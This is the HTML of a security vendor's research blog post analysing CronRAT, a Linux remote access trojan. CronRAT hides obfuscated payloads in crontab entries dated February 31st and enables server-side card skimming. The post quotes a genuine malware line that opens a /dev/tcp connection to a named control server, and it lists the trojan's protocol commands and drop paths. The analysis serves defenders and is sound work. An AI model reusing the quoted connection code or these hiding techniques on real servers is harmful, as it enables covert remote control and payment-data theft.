<!DOCTYPE html><html lang="en" class="no-transition promotion-enabled" translate="no"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="X-UA-Compatible" content="ie=edge"><meta property="og:locale" content="en_US"><meta property="og:title" content="CronRAT malware hides behind February 31st &ndash; Sansec"><meta name="author" content="Sansec Team"><meta property="og:url" content="https://sansec.io/research/cronrat"><meta property="og:site_name" content="Sansec"><meta property="og:image" content="https://sansec.io/assets/posts/cache/c5ced30f35f2b6fd0bb78b596dcc6e8f.png"><meta property="og:type" content="article"><meta property="article:published_time" content="2021-11-24T00:00:00+01:00"><meta property="article:author" content="https://www.twitter.com/sansecio"><meta name="description" content="
"><meta property="og:description" content="
"><meta name="twitter:title" content="CronRAT malware hides behind February 31st"><meta name="twitter:image" content="https://sansec.io/assets/posts/cache/c5ced30f35f2b6fd0bb78b596dcc6e8f.png"><meta name="twitter:description" content="
"><meta name="twitter:site" content="@sansecio"><meta name="twitter:card" content=" summary_large_image"><link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon"><link rel="stylesheet" href="/assets/css/main.css?52229e3"><link rel="canonical" href="https://sansec.io/research/cronrat"><link type="text/plain" rel="author" href="/humans.txt"><link rel="alternate" type="application/atom+xml" title="Sansec &ndash; Secure stores, happy shoppers" href="/atom.xml"><script>!function(e,t,a,n){e[n]=e[n]||[],e[n].push({"gtm.start":(new Date).getTime(),event:"gtm.js"});var g=t.getElementsByTagName(a)[0],m=t.createElement(a);m.async=!0,m.src="https://www.googletagmanager.com/gtm.js?id=GTM-W4VK6TQ",g.parentNode.insertBefore(m,g)}(window,document,"script","dataLayer")</script><script type="text/javascript">window._mfq=window._mfq||[],function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//cdn.mouseflow.com/projects/b8b33745-29ba-4a8d-8a21-4019ba29e934.js",document.getElementsByTagName("head")[0].appendChild(e)}()</script><title>CronRAT malware hides behind February 31st &ndash; Sansec</title><script type="application/ld+json">{
      "@context": "https://schema.org",
      "@type": "Organization",
      "url": "https://sansec.io",
      "logo": "https://sansec.io/assets/posts/sansec-1107x208.png"
    }</script><script>var Sansec={menu:[{name:"Product",link:"/ecomscan"},{name:"Pricing",link:"/pricing"},{name:"Resources",sub:[{name:"News",link:"/news"},{name:"Research",link:"/research"},{name:"Partners",link:"/partners"},{name:"Support",link:"/support"}]},{type:"spacer"},{name:"Company",link:"/company"},{name:"Contact",link:"/contact"}]}</script><script type="application/ld+json">{
    "description": "
",
    "author": { "@type": "Person", "name": "Sansec Team" },
    "@type": "BlogPosting",
    "url": "canon_url",
    "image": "/assets/posts/cache/c5ced30f35f2b6fd0bb78b596dcc6e8f.png",
    "headline": "CronRAT malware hides behind February 31st",
    "dateModified": "2021-12-16T22:56:02+01:00",
    "datePublished": "2021-11-24T00:00:00+01:00",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://sansec.io/research/cronrat"
    },
    "@context": "https://schema.org"
  }</script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W4VK6TQ" height="0" width="0" style="display: none; visibility: hidden;"></iframe></noscript><div class="app"><header><div class="header__promotion__container"><div class="header__promotion__block-wrapper"><div class="header__promotion__block text_bold"><div><a class="link-like_white text_boldest" href="/ecomscan">eComscan</a> secures over 7,000 online stores</div><a class="header__promotion__link" href="/pricing"><ul class="header__promotion__list"><li>30-day money back guarantee</li><li>Easy 5 minute install</li><li>Cancel any time</li></ul></a></div></div></div><div class="header__block__container header__company-logo__container"><a class="company-logo" href="/"><div class="company-logo__img resource resource-logo"></div></a></div><div id="mobile-menu" class="mobile-menu"><div class="col col_mobile-menu"><div class="row mobile-menu__header"><a class="company-logo" href="/"><div class="company-logo__img resource resource-logo"></div></a><div id="mobile-menu__action" class="mobile-menu__action resource has-tap-area"></div></div><ul id="mobile-menu__current-menu" class="col mobile-menu__current-menu"></ul><div class="col mobile-menu__help-block"><a href="/getting-started"><span class="help-text text_underlined no-whitespace">Get started in 5 minutes!</span></a></div></div></div><div class="header__block__container header__navigation__container"><div class="header__navigation__wrapper"><nav><ul class="header__navigation-menu"><li><a class="navigation-menu__link" href="/ecomscan">Product</a></li><li><a class="navigation-menu__link" href="/pricing">Pricing</a></li><li><span id="resources" class="navigation-menu__option has-hover">Resources</span><div class="navigation-menu__submenu-container"><ul class="navigation-menu__submenu" data-menu-for="resources"><li><a href="/news" class="navigation-menu__link">News</a></li><li><a href="/research" class="navigation-menu__link">Research</a></li><li><a href="/partners" class="navigation-menu__link">Partners</a></li><li><a href="/support" class="navigation-menu__link">Support</a></li></ul></div></li><li class="navigation-menu__spacer"></li><li><a class="navigation-menu__link" href="/company">Company</a></li><li><a class="navigation-menu__link" href="/contact">Contact</a></li></ul></nav></div></div><div id="menu" class="has-tap-area"><svg class="hamburger" viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><g stroke="#1d2227" stroke-width="2"><path d="m0 1h24"></path><path d="m0 9h24"></path><path d="m0 17h24"></path></g></svg></div><div class="header__block__container header__help__container visible-sm"><div class="header__help"><div class="help-cell help-cell-1"><span class="help-text help-text text_underlined no-whitespace">Get started in 5 minutes!</span></div><div class="help-cell help-cell-2"><a href="/getting-started#pricing" class="help-text">Secure your store today.<br><span class="help-text text_underlined">CLICK HERE</span></a></div></div></div></header><main><section class="hero_simple with-centered-circle centered-circle_small centered-circle-bottom-left_offset"><div class="col container-sm top-xs"><div class="hero__contents hero__contents-simple"><h1>CronRAT malware hides behind February 31st</h1></div></div></section><section class="wrapper_sm is-pushed-xs"><div class="col sticky-container"><article class="article"><ul class="article__meta wrapper_sm container-sm"><li class="meta-block meta-block_left"><div class="meta-block__container"><div class="meta-block-breadcrumbs"><p class="meta__date">24th November 2021</p><a href="/research">Web Skimming</a> / Sansec Threat Research</div><div class="article-block has-shadow_slight visible-xxl sticky" data-aos="fade-right" data-aos-offset="50"><h6>Learn about new eCommerce hacks?</h6><p>Receive an alert whenever we discover new hacks or vulnerabilities that may affect your online store.</p><newsletter data-classes="newsletter_article"></newsletter></div></div></li><li class="meta-block_centered"></li><li class="meta-block"><div class="meta-block__container"><div class="article-block has-shadow_slight resource resource-code visible-xxl sticky" data-aos="fade-left"><h5>What is<br>Magecart?</h5><p>Also known as digital skimming, this crime has surged since 2015. Criminals steal card data during online shopping. Who are behind these notorious hacks, how does it work, and how have Magecart attacks evolved over time?</p><a class="button" href="/what-is-magecart">About Magecart</a></div></div></li></ul><div class="article__contents container-sm"><div class="article__image article__headline-image"><img src="/assets/posts/cache/c5ced30f35f2b6fd0bb78b596dcc6e8f.png" alt="CronRAT malware hides behind February 31st"></div><div class="article__content"><p><strong>In the run-up to Black Friday, Sansec discovered a sophisticated threat that is packed with never-seen stealth techniques. This malware, dubbed ‚ÄúCronRAT‚Äù, hides in the Linux calendar system on February 31st. It is not recognized by other security vendors and is likely to stay undetected on critical infrastructure for the coming months. CronRAT enables server-side Magecart data theft which bypasses browser-based security solutions.</strong></p><p>At this time of year we typically see a surge in eCommerce attacks and new malware. Last week we analyzed a clever <a href="/research/ecommerce-malware-linux-avp">malware</a> attacking online stores, and today we expose another, much more sophisticated threat. It is a Remote Access Trojan (RAT) and we have named it CronRAT.</p><p>Sansec found CronRAT to be present on multiple online stores, among them a nation‚Äôs largest outlet. Because of its novel execution, we had to rewrite part of our <a href="/ecomscan">eComscan</a> algorithm in order to detect it. CronRAT is currently <a href="https://www.virustotal.com/gui/file/b46e51a2e757f4d75f1a1fff1165c6a0503b687db6c7e672021dcaa9bedf2d88/detection">undetected</a> by other security vendors.</p><p>CronRAT‚Äôs main feat is hiding in the calendar subsystem of Linux servers (‚Äúcron‚Äù) on a nonexistant day. This way, it will not attract attention from server administrators. And many security products do not scan the Linux cron system.</p><p>CronRAT facilitates persistent control over an eCommerce server. Sansec has studied several cases where the presence of CronRAT lead to the injection of payment skimmers (aka <a href="/what-is-magecart">Magecart</a>) in server-side code.</p><p>Sansec director of threat research Willem de Groot observes:</p><blockquote><p>Digital skimming is moving from the browser to the server and this is yet another example. Most online stores have only implemented browser-based defenses, and criminals capitalize on the unprotected back-end. Security professionals should really consider the full attack surface.</p></blockquote><p>CronRAT‚Äôs stealth capabilities pose a serious threat to Linux eCommerce servers:</p><ul><li>Fileless execution</li><li>Timing modulation</li><li>Anti-tampering checksums</li><li>Controlled via binary, obfuscated protocol</li><li>Launches tandem RAT in separate Linux subsystem</li><li>Control server disguised as ‚ÄúDropbear SSH‚Äù service</li><li>Payload hidden in legitimate CRON scheduled task names</li></ul><h2 id="technical-analysis">Technical analysis</h2><p></p><div class="article__image"><img class="lazy" data-src="/assets/posts/cache/1bba56eb0615c0f758a8cab2c709ee19.png" alt=""></div><p></p><p>The CronRAT adds a number of tasks to crontab with a curious date specification: <code class="highlighter-rouge">52 23 31 2 3</code>. These lines are syntactically valid, but would generate a run time error when executed. However, this will never happen as they are scheduled to run on February 31st. Instead, the actual malware code is hidden in the task names and is constructed using several layers of compression and base64 decoding.</p><p></p><div class="article__image"><img class="lazy" data-src="/assets/posts/cache/306c46518a35529e83eb04c11aca66ea.png" alt=""></div><p></p><p>The actual payload (see <a href="https://gist.github.com/gwillem/fbe3e6b98e2e10d7f1f271ca4b6e813f">raw</a> and <a href="https://gist.github.com/gwillem/fbe3e6b98e2e10d7f1f271ca4b6e813f#file-cronrat-annotated-sh">annotated</a> copy) is a sophisticated Bash program that features self-destruction, timing modulation and a custom binary protocol to communicate with a foreign control server. As one security engineer remarks:</p><blockquote class="twitter-tweet" data-conversation="none" data-lang="en" data-theme="light"><p lang="en" dir="ltr">I thought I had mastered bash, but that script is giving me a headacheüòÖ</p>&mdash; „Ç¢„É´„Éü (@schrotthaufen) <a href="https://twitter.com/schrotthaufen/status/1463977342666170372?ref_src=twsrc%5Etfw">November 25, 2021</a></blockquote><p>Upon launch, it contacts the control server using an uncommon method for TCP communication:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span> <span class="s2">"exec 3&lt;&gt;/dev/tcp/796077735/</span><span class="k">$((</span><span class="m">0</span>x1bb<span class="k">))</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">||</span> exit_with_code 5
</code></pre></div></div><p>This resolves to port <code class="highlighter-rouge">443</code> on <code class="highlighter-rouge">47.115.46.167</code>, an Alibaba hosted IP. This service generates a banner for the Dropbear SSH service, which is commonly installed on embedded devices. However, this is clearly a disguise.</p><p></p><div class="article__image"><img class="lazy" data-src="/assets/posts/cache/685b006d57d2c7433d9935ec1257b27e.png" alt=""></div><p></p><p>CronRAT implements a custom binary protocol with random checksums, to avoid detection by firewalls and packet inspectors.</p><p></p><div class="article__image"><img class="lazy" data-src="/assets/posts/cache/59d1d9c21731d1f1c6364d3b7022fbf5.png" alt=""></div><p></p><p>Once a connection with the C&amp;C server is established, CronRAT takes these steps:</p><ol><li>Discards the fake <code class="highlighter-rouge">SSH-2.0-dropbear_2017.75</code> banner.</li><li>Sends a password, the <code class="highlighter-rouge">cio</code> command and then (presumably) a host identifier.</li><li>Waits for a <code class="highlighter-rouge">sd</code> (self-destruct) or <code class="highlighter-rouge">ev</code> (eval) command from the control server</li><li>Sends <code class="highlighter-rouge">prm</code> command and password/identifier, then receives command parameters for the sidekick RAT</li><li>Sends <code class="highlighter-rouge">dwn</code> command and receives malicious dynamic library</li><li>Library is saved to one of these paths: <code class="highlighter-rouge">/dev/shm</code>, <code class="highlighter-rouge">/run/user/UID</code>, <code class="highlighter-rouge">/tmp</code>, <code class="highlighter-rouge">/var/tmp</code>, <code class="highlighter-rouge">HOME</code>, with one of these file names: <code class="highlighter-rouge">www-shared</code>, <code class="highlighter-rouge">server-worker-shared</code>, <code class="highlighter-rouge">sql-shared</code>, <code class="highlighter-rouge">php-shared</code>, <code class="highlighter-rouge">systemd-user.lock</code>, <code class="highlighter-rouge">php.lock</code>, <code class="highlighter-rouge">php-fpm.lock</code>, <code class="highlighter-rouge">www-server.lock</code>, <code class="highlighter-rouge">php_sess_RANDOM</code>, <code class="highlighter-rouge">zend_cache___RANDOM</code>, <code class="highlighter-rouge">php_cache</code>, <code class="highlighter-rouge">www_cache</code>, <code class="highlighter-rouge">worker_cahce</code> (sic), <code class="highlighter-rouge">logo_edited_DATE.png</code>, <code class="highlighter-rouge">user_edited_DATE.css</code>, <code class="highlighter-rouge">custom_edited_DATE.css</code></li><li>Runs custom <code class="highlighter-rouge">prm</code> command with the custom library loaded via <code class="highlighter-rouge">LD_PRELOAD</code>.</li><li>Monitors custom command for 5 seconds and, depending on success, sends <code class="highlighter-rouge">ssc</code>, <code class="highlighter-rouge">ser</code> or <code class="highlighter-rouge">sun</code> command.</li><li>Finishes with <code class="highlighter-rouge">cex</code> command.</li></ol><p>This essentially allows the RAT operator to run any code.</p><h2 id="coming-up">Coming up</h2><p>In order to study the control server‚Äôs behavior, we wrote a specially crafted RAT client to intercept commands. And we tricked the C2 server into sending us yet another RAT, which manages to embed itself in the Nginx web server process. <a href="/research/nginrat">Read about NginRAT</a>.</p><p><em>We greatly appreciate the help of <a href="https://nl.linkedin.com/in/ciprianogroenendal">Cipriano Groenendal</a> at <a href="https://www.hypernode.com">Hypernode</a> for providing malware samples and valuable analysis.</em></p></div><div><a class="twitter-follow-button" href="https://twitter.com/sansecio">data-size="large" > Follow @sansecio</a></div></div></article></div></section><section class="bg_grey"><div class="wrapper_card container-sm pull-me-up-xs"><div class="col action-card has-shadow_slight with-centered-circle centered-circle_small centered-circle-bottom-left centered-circle_yellow" data-aos="fade-up"><div class="col action-card__contents"><h5>Stay ahead of eCommerce hacks,<br>protect your store today!</h5><p>Sansec forensic experts were the first to document large scale digital skimming in 2015. Since then, we have investigated thousands of hacked stores. Our research of the latest attack vectors protects our customers around the world. Our anti-skimming technology and data are used by merchants, forensic investigators, financial anti-fraud teams and service providers</p><a class="button action-card__button" href="/ecomscan">Try our malware scanner</a></div></div></div></section></main><footer class="with-centered-circle centered-circle_bottom-to-right centered-circle_yellow"><script type="text/javascript"></script><div class="footer__contents"><div class="footer__top row top-xs space-between-xs"><div class="footer__top__block visible-sm"><span class="footer__top__block__title">Made with <span class="icon_green">‚ù§</span> in Europe</span><ul class="footer__address"><li>Sansec BV</li><li>Europalaan 20</li><li>3526 KS Utrecht</li><li>The Netherlands</li><li><a href="/cdn-cgi/l/email-protection#aac3c4ccc5ead9cbc4d9cfc984c3c5"><span class="__cf_email__" data-cfemail="345d5a525b7447555a4751571a5d5b">[email&#160;protected]</span></a></li></ul></div><div class="footer__top__block visible-sm"><ul class="footer__links__list"><li><a href="/ecomscan">Product</a></li><li><a href="/pricing">Pricing</a></li><li><a href="/support">Support</a></li><li><a href="/partners">Partners</a></li><li><a href="/magento-usage-data">Magento Stats</a></li><li><a href="/malware">Malware Library</a></li><li><a href="/research/cardbleed">Cardbleed</a></li></ul></div><div class="footer__top__block visible-sm"><ul class="footer__links__list"><li><a href="/research">Research</a></li><li><a href="/news">News</a></li><li><a href="/company">Company</a></li><li><a href="/contact">Contact</a></li><li><a href="#" data-cb-type="portal" class="footer__login">Log in</a></li></ul></div><div class="footer__top__block"><div class="stay-informed"><div class="stay-informed__title">Stay up to date with the latest eCommerce attacks</div><newsletter data-classes="newsletter_footer"></newsletter></div></div></div><div class="footer__company"><div class="col row-sm middle-xs space-between-sm baseline-sm"><div class="company-logo"><div class="company-logo__img resource resource-logo_white"></div></div><div class="motto">Secure stores, happy shoppers</div></div><div class="footer__separator"></div><div class="col row-sm middle-sm space-between-sm"><div class="footer__social_networks"><a class="resource resource-twitter" href="https://twitter.com/sansecio" target="_blank"></a> <a class="resource resource-linkedin" href="https://www.linkedin.com/company/sansec/" target="_blank"></a> <a class="resource resource-mail" href="/cdn-cgi/l/email-protection#7910171f16390a18170a1c1a571016"></a></div><div class="footer__terms"><div class="footer__terms__item"><a class="footer__terms__link has-tap-area tap-area_sm" href="/downloads/sansec_tc.pdf">Terms & Conditions</a><div class="footer__terms__separator">|</div><a class="footer__terms__link has-tap-area tap-area_sm" href="/downloads/sansec_pcp.pdf">Privacy & Cookie Policy</a><div class="footer__terms__separator visible-sm">|</div></div><div class="footer__terms__item"><span>Company Reg 77165187</span><div class="footer__terms__separator">|</div><span>Tax NL860920306B01</span></div></div></div></div></div></footer></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="/assets/js/main.js?52229e3"></script><script src="https://js.chargebee.com/v2/chargebee.js" data-cb-site="sansec"></script><script async src="/assets/js/sticky.js?52229e3"></script><script async src="/assets/js/newsletter.js?52229e3" type="text/javascript" charset="utf-8"></script><script>!function(e,t,n,i,a,c){e.twq||((i=e.twq=function(){i.exe?i.exe.apply(i,arguments):i.queue.push(arguments)}).version="1.1",i.queue=[],(a=t.createElement(n)).async=!0,a.src="//static.ads-twitter.com/uwt.js",(c=t.getElementsByTagName(n)[0]).parentNode.insertBefore(a,c))}(window,document,"script"),twq("init","o54o6"),twq("track","PageView")</script><script type="text/javascript">_linkedin_partner_id="3076097",window._linkedin_data_partner_ids=window._linkedin_data_partner_ids||[],window._linkedin_data_partner_ids.push(_linkedin_partner_id)</script><script type="text/javascript">!function(){var t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://snap.licdn.com/li.lms-analytics/insight.min.js",t.parentNode.insertBefore(e,t)}()</script><noscript><img height="1" width="1" style="display: none" alt="" src="https://px.ads.linkedin.com/collect/?pid=3076097&fmt=gif"></noscript><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></body></html>